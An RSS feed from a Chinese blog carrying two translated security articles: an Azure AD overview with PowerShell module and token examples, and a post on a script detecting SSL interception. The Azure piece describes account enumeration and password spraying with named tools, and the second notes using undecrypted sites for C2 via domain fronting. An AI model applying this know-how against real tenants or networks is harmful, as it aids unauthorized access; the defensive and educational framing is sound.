<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>PowerShell on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/powershell/</link>
        <description>Recent content in PowerShell on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Wed, 06 Aug 2025 08:06:05 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/powershell/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>深入解析Azure Active Directory：微软云身份认证的核心架构</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90azure-active-directory%E5%BE%AE%E8%BD%AF%E4%BA%91%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/</link>
        <pubDate>Wed, 06 Aug 2025 08:06:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90azure-active-directory%E5%BE%AE%E8%BD%AF%E4%BA%91%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/</guid>
        <description>&lt;h1 id=&#34;什么是azure-active-directory&#34;&gt;什么是Azure Active Directory？
&lt;/h1&gt;&lt;p&gt;许多人都熟悉Windows Server中的本地目录和认证系统——Active Directory，但Azure Active Directory究竟是什么？Azure Active Directory（Azure AD或AAD）是一个多租户云目录和认证服务。它是Office 365（和Azure）用于账户、组和角色的目录服务，同时也是一个支持联合认证（SAML等）的身份提供者（IdP）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：鉴于云技术的快速变化，本文部分内容可能在发布后不久就会过时。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;azure-ad的高可用性架构&#34;&gt;Azure AD的高可用性架构
&lt;/h2&gt;&lt;p&gt;Azure AD具有极高的可用性和全球部署能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在全球30多个数据中心部署，并利用Azure可用区&lt;/li&gt;
&lt;li&gt;数据写入后至少会复制到4个（最多13个）数据中心&lt;/li&gt;
&lt;li&gt;每个数据中心内数据至少复制9次以实现持久性和负载均衡&lt;/li&gt;
&lt;li&gt;系统定期进行故障注入测试，甚至模拟整个数据中心宕机&lt;/li&gt;
&lt;li&gt;目前运行在超过30万个CPU核心上，每周处理超过11PB的监控数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;azure-ad不是云版本的ad&#34;&gt;Azure AD不是云版本的AD
&lt;/h2&gt;&lt;p&gt;Azure Active Directory并不是托管在云端的Active Directory。它不支持传统的AD认证方法（如NTLM或Kerberos）、没有LDAP协议，也不支持组策略（GPO），因此不适用于传统的本地应用程序。&lt;/p&gt;
&lt;p&gt;微软Azure（Azure Active Directory Domain Services）、亚马逊AWS（Amazon Managed Microsoft AD）和谷歌云（Managed Service for Microsoft AD）都提供可以用于管理云工作负载的托管Active Directory环境。这些环境都有2个或更多域控制器，租户管理员不会获得域管理员权限，只能获得特定OU和GPO的委派管理权限。&lt;/p&gt;
&lt;h2 id=&#34;主要管理工具&#34;&gt;主要管理工具
&lt;/h2&gt;&lt;p&gt;大多数AD管理员熟悉的工具是Active Directory用户和计算机（ADUC，MMC工具）。Azure Active Directory管理员主要使用https://portal.azure.com网页控制台进行管理。&lt;/p&gt;
&lt;p&gt;管理本地AD和Azure AD/Office 365的管理员将同时使用本地MMC工具和网页管理门户（及其各种相关URL）。虽然Azure AD也有PowerShell cmdlet（类似于本地AD），但云功能的发展速度通常快于PowerShell工具的发布速度，因此即使在使用PowerShell时，仍应使用云管理门户。&lt;/p&gt;
&lt;h2 id=&#34;与azure-ad交互&#34;&gt;与Azure AD交互
&lt;/h2&gt;&lt;p&gt;由于Azure AD没有LDAP，与之交互需要通过Graph API或PowerShell模块。有两个主要的PowerShell模块用于与Azure AD交互：MSOnline和AzureAD。可以通过以下命令安装：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MSOnline&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AzureAD&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;AzureAD模块可能最终会取代MSOnline PowerShell模块，但MSOnline中有些功能尚未移植到AzureAD模块。&lt;/p&gt;
&lt;h2 id=&#34;azure-ad-powershell模块和cmdlet对比&#34;&gt;Azure AD PowerShell模块和cmdlet对比
&lt;/h2&gt;&lt;p&gt;（截至2020年1月的模块和cmdlet数据）&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类别&lt;/th&gt;
          &lt;th&gt;MSOnline&lt;/th&gt;
          &lt;th&gt;AzureAD&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;管理单元&lt;/td&gt;
          &lt;td&gt;Get-MsolAdministrativeUnit&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;应用&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;Get-AzureADApplication&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;联系人&lt;/td&gt;
          &lt;td&gt;Get-MsolContact&lt;/td&gt;
          &lt;td&gt;Get-AzureADContact&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;设备&lt;/td&gt;
          &lt;td&gt;Get-MsolDevice&lt;/td&gt;
          &lt;td&gt;Get-AzureADDevice&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;域&lt;/td&gt;
          &lt;td&gt;Get-MsolDomain&lt;/td&gt;
          &lt;td&gt;Get-AzureADDomain&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;组&lt;/td&gt;
          &lt;td&gt;Get-MsolGroup&lt;/td&gt;
          &lt;td&gt;Get-AzureADGroup&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;用户&lt;/td&gt;
          &lt;td&gt;Get-MsolUser&lt;/td&gt;
          &lt;td&gt;Get-AzureADUser&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;（表格中详细列出了两个模块的cmdlet对比，此处仅展示部分）&lt;/p&gt;
&lt;h2 id=&#34;使用adal实现单点登录&#34;&gt;使用ADAL实现单点登录
&lt;/h2&gt;&lt;p&gt;微软云环境最初只支持用户名和密码认证。这种&amp;quot;传统认证&amp;quot;不包括多因素认证（MFA），出于安全考虑，应通过安全默认值、条件访问等禁用传统认证。&lt;/p&gt;
&lt;p&gt;Azure Active Directory认证库（ADAL）提供&amp;quot;现代认证&amp;quot;，完全支持MFA（甚至无密码认证）。根据微软的定义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ADAL使开发人员能够通过以下功能更轻松地进行认证：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可配置的令牌缓存，存储访问令牌和刷新令牌&lt;/li&gt;
&lt;li&gt;当访问令牌过期且存在刷新令牌时自动刷新令牌&lt;/li&gt;
&lt;li&gt;支持异步方法调用&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;安装ADAL PowerShell模块（&lt;code&gt;Install-Module -Name adal.ps&lt;/code&gt;）后，可以运行以下命令加载ADAL令牌：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$clientId&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1b730954-1685-4b74-9bfd-dac224a7b894&amp;#34;&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# Azure AD PowerShell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$redirectUri&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;urn:ietf:wg:oauth:2.0:oob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$authority&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://login.windows.net/common/oauth2/authorize&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$resourceUrl&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://graph.windows.net&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ADALresponse&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-adaltoken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Resource&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$resourceUrl&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ClientId&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$clientId&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-RedirectUri&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$redirectUri&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Authority&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$authority&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PromptBehavior:Always&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;azure-ad的访问权限&#34;&gt;Azure AD的访问权限
&lt;/h2&gt;&lt;p&gt;在Active Directory中，几乎所有内容都可以作为普通用户查看。Azure AD用户可以查看有关用户和组的信息，但在可访问性方面存在一些限制。在Azure AD中，特权组被称为&amp;quot;角色&amp;quot;（实际上是组），用于标识特殊访问权限。Office 365中有几个这样的管理员角色，提供对整个Office 365或特定部分的管理级权限。&lt;/p&gt;
&lt;p&gt;许多组织在全局管理员（又称租户管理员）角色中有一个报告账户，该角色实际上是集成了企业管理员、域管理员和架构管理员权限的单一组。全局管理员对Azure AD和所有Office 365服务拥有完全控制权。这就是为什么许多组织的全局管理员超过5个（微软推荐的最大数量）。只有云账户应被添加到角色中，以便他们可以利用Azure MFA（和无密码认证）以及由PIM控制的角色成员资格。&lt;/p&gt;
&lt;p&gt;还强烈建议创建一个（或两个）&amp;ldquo;应急&amp;quot;管理员账户，以确保对租户的持续特权访问。微软发布了一份关于如何保护特权访问的文档。&lt;/p&gt;
&lt;p&gt;特权身份管理（PIM）强烈推荐用于控制角色成员资格，需要为每个将使用PIM的账户购买Azure AD Premium 2（P2）许可证。PIM提供对具有所需权限的管理角色的即时访问。当管理员需要管理员权限时，他们可以通过PIM请求并获得访问权限（可以发送审批或自动批准）。微软建议所有角色中的账户都由PIM管理（并拥有AAD P2许可证）。&lt;/p&gt;
&lt;p&gt;还有一个用于PIM的PowerShell模块可以安装：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Azure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ActiveDirectory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PIM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PSModule&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;2019年秋季，微软添加了一个名为&amp;quot;全局读取者&amp;quot;的新角色，该角色对所有Azure AD/Office 365服务具有只读/查看权限，这些服务全局管理员可以看到（有一些例外，因为微软仍在向所有Office 365服务推出全局读取者只读功能）。全局读取者的成员资格应提供给需要Microsoft Cloud（Azure AD和Office 365）环境只读访问权限的安全团队或审计人员。&lt;/p&gt;
&lt;h2 id=&#34;攻击azure-active-directory&#34;&gt;攻击Azure Active Directory
&lt;/h2&gt;&lt;p&gt;Office 365服务默认可从互联网访问（使用条件访问限制访问），这使其对攻击者具有吸引力。攻击者利用几种攻击方法针对Azure AD和Office 365。&lt;/p&gt;
&lt;h3 id=&#34;账户枚举&#34;&gt;账户枚举
&lt;/h3&gt;&lt;p&gt;在传统的Active Directory中，任何Active Directory用户都可以枚举所有用户账户和管理组成员资格（只要有域控制器的网络访问权限）。&lt;/p&gt;
&lt;p&gt;Azure Active Directory用户可以枚举所有用户账户和管理组成员资格（只要有Office 365服务的访问权限，默认是互联网）。使用O365creeper等工具，甚至可以在没有账户的情况下进行用户枚举，该工具尝试使用电子邮件地址列表向O365进行认证。根据响应代码，工具确定电子邮件地址是否是有效用户账户。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Azure AD枚举工具&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;O365 Creeper - Office 365认证页面（Python）[账户发现]&lt;/li&gt;
&lt;li&gt;OWA（Golang）&lt;/li&gt;
&lt;li&gt;ActiveSync（Python）&lt;/li&gt;
&lt;li&gt;MSOnline/AzureAD PowerShell模块（PowerShell）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;密码喷洒&#34;&gt;密码喷洒
&lt;/h3&gt;&lt;p&gt;攻击者以及许多渗透测试人员和红队人员常用的方法称为&amp;quot;密码喷洒&amp;rdquo;。密码喷洒是有趣的，因为它是针对所有用户的自动化密码猜测。这种针对所有用户的自动化密码猜测通常可以避免账户锁定，因为使用特定密码的登录尝试是针对每个用户执行的，而不是针对一个特定用户，这正是账户锁定设计要防范的。&lt;/p&gt;
&lt;p&gt;攻击者从一个他们将要尝试的密码列表开始，从最可能的密码（&amp;ldquo;Fall2017&amp;rdquo;、&amp;ldquo;Winter2018&amp;quot;等）开始。当密码喷洒开始时，我们从列表中的第一个密码开始。第一个密码用于尝试作为每个用户进行认证。这个密码针对每个用户尝试后，我们继续下一个密码。&lt;/p&gt;
&lt;p&gt;密码喷洒相对容易执行且非常有效。我们与许多组织合作过，他们的云环境账户因密码喷洒而遭到入侵。许多联合客户没有意识到这是他们的工作，而不是云的工作。密码喷洒的风险不仅限于云。如果云账户和本地账户使用相同的密码且未配置MFA，攻击者可能通过密码喷洒云账户然后获得企业网络访问权限。这不是理论或假设的场景，强调了MFA的重要性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Office 365密码喷洒工具&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ruler（Exchange）[Golang]&lt;/li&gt;
&lt;li&gt;SprayingToolkit（Lync/Skype for Business/OWA）[Python]&lt;/li&gt;
&lt;li&gt;LyncSniper（Lync/Skype for Business）[PowerShell]&lt;/li&gt;
&lt;li&gt;MailSniper（OWA/EWS）[PowerShell]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Office 365密码喷洒缓解&lt;/strong&gt;
通过启用&amp;quot;安全默认值&amp;quot;或配置自定义条件访问策略禁用传统认证。还强烈建议要求所有用户使用MFA。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Office 365密码喷洒检测&lt;/strong&gt;
假设密码喷洒针对Office 365服务且未配置联合（ADFS、Okta等），则可以通过参考Azure AD登录日志进行检测。&lt;/p&gt;
&lt;p&gt;通过关联同一用户在时间范围内的多个事件，其中登录错误代码为&amp;quot;50126&amp;quot;且客户端应用为&amp;quot;其他客户端；旧版Office客户端&amp;rdquo;（这意味着执行了传统认证）来检测。&lt;/p&gt;
&lt;h3 id=&#34;账户令牌窃取和重用&#34;&gt;账户令牌窃取和重用
&lt;/h3&gt;&lt;p&gt;由于云认证通常会在认证的应用或网页浏览器中存储令牌，这是认证的证明，可能会被重用。网页浏览器通常将此认证令牌存储为cookie。如果这些数据被盗，攻击者可能利用这些数据伪造访问并配置持久性以保持持续访问。&lt;/p&gt;
&lt;h2 id=&#34;azure-ad审查&#34;&gt;Azure AD审查
&lt;/h2&gt;&lt;p&gt;微软的Azure AD GitHub包括用于审查Azure AD配置的PowerShell代码（https://github.com/AzureAD/AzureADAssessment）&lt;/p&gt;
&lt;p&gt;Trimarc还提供了一项名为Microsoft Cloud Security Assessment（MCSA）的新服务，类似于本地Active Directory安全评估，但专注于Azure AD和Office 365。&lt;/p&gt;
&lt;h2 id=&#34;其他office-365服务powershell模块&#34;&gt;其他Office 365服务PowerShell模块
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Exchange Online模块
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExchangeOnlineManagement&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Microsoft SharePoint
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Online&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;SharePoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PowerShell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Microsoft Teams
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MicrosoftTeams&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Microsoft Skype for Business Online&lt;/li&gt;
&lt;li&gt;Microsoft InTune
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Graph&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Intune&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;（需要管理员提供管理员同意：&lt;code&gt;Connect-MSGraph -AdminConsent&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>你被监控了吗？检测SSL中间人攻击</title>
        <link>http://localhost:1313/p/%E4%BD%A0%E8%A2%AB%E7%9B%91%E6%8E%A7%E4%BA%86%E5%90%97%E6%A3%80%E6%B5%8Bssl%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</link>
        <pubDate>Tue, 05 Aug 2025 18:42:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%A0%E8%A2%AB%E7%9B%91%E6%8E%A7%E4%BA%86%E5%90%97%E6%A3%80%E6%B5%8Bssl%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</guid>
        <description>&lt;h1 id=&#34;你被监控了吗检测ssl中间人攻击&#34;&gt;你被监控了吗？检测SSL中间人攻击
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者：Carrie Roberts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;你的雇主是否在监控你工作电脑上的所有敏感网络浏览信息？很可能。但如何确认？&lt;/p&gt;
&lt;p&gt;企业通常会部署SSL解密代理以更好地保护资产安全——这是你入职时就同意的条款（至少在使用公司网络和管理设备时）。不过你可能想知道：哪些HTTPS流量会被解密？哪些不会？例如，企业可能为避免法律风险，不会解密银行网站（含密码信息）或政府网站（.gov）的流量。&lt;/p&gt;
&lt;p&gt;为此，我开发了PowerShell脚本&lt;strong&gt;Detect-SSLmitm&lt;/strong&gt;（&lt;a class=&#34;link&#34; href=&#34;https://github.com/blackhillsinfosec&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;下载链接&lt;/a&gt;），用于检测外部服务器的HTTPS连接是否被解密。渗透测试人员尤其需要关注未解密的站点——若流量未被解密，通过域前置（Domain Fronting）等技术建立C2通信的成功率会更高。&lt;/p&gt;
&lt;p&gt;脚本原理是通过对比证书哈希值判断是否存在中间人解密。感谢**@malcomvetter**提出的改进建议，例如通过比对中间证书减少误报。&lt;/p&gt;
&lt;h2 id=&#34;使用示例&#34;&gt;使用示例
&lt;/h2&gt;&lt;p&gt;运行方式非常简单（如下图）：
![检测结果示例]
输出显示，仅usbank.com和whitehouse.gov站点未被解密。&lt;/p&gt;
&lt;h2 id=&#34;自定义配置&#34;&gt;自定义配置
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;编辑脚本添加目标测试站点&lt;/li&gt;
&lt;li&gt;在确认无SSL解密的网络环境中运行&lt;code&gt;Get-GoldenHashes&lt;/code&gt;函数更新黄金证书哈希列表
（注意：若在解密环境中生成哈希会导致误报）&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Carrie是BHIS的常驻客座作者，我们非常欢迎她的贡献！&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
